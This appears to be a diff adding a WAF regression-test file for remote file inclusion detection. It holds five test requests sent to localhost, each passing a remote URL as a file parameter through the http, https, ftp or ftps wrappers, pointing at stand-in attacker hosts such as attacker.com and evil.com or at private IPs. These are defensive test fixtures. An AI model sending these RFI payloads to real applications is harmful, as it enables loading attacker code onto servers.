@@ -1,0 +1,76 @@
+meta:
+  author: "Antigravity"
+  description: "Remote File Inclusion (RFI) Tests"
+  enabled: true
+  name: "931-rfi"
+tests:
+  - test_id: 931100
+    desc: "RFI via http wrapper"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              User-Agent: "WAF-Tester"
+              Host: "localhost"
+            uri: "/?file=http://attacker.com/shell.php"
+          output:
+            log_contains: "id \"931"
+  - test_id: 931101
+    desc: "RFI via https wrapper"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              User-Agent: "WAF-Tester"
+              Host: "localhost"
+            uri: "/?page=https://evil.com/malware"
+          output:
+            log_contains: "id \"931"
+  - test_id: 931102
+    desc: "RFI via ftp wrapper"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              User-Agent: "WAF-Tester"
+              Host: "localhost"
+            uri: "/?doc=ftp://attacker.com/pub/exploit"
+          output:
+            log_contains: "id \"931"
+  - test_id: 931103
+    desc: "RFI via ftps wrapper"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              User-Agent: "WAF-Tester"
+              Host: "localhost"
+            uri: "/?image=ftps://192.168.1.1/shell"
+          output:
+            log_contains: "id \"931"
+  - test_id: 931104
+    desc: "RFI via IP address in URL"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              User-Agent: "WAF-Tester"
+              Host: "localhost"
+            uri: "/?include=http://10.0.0.1/cmd.txt"
+          output:
+            log_contains: "id \"931"
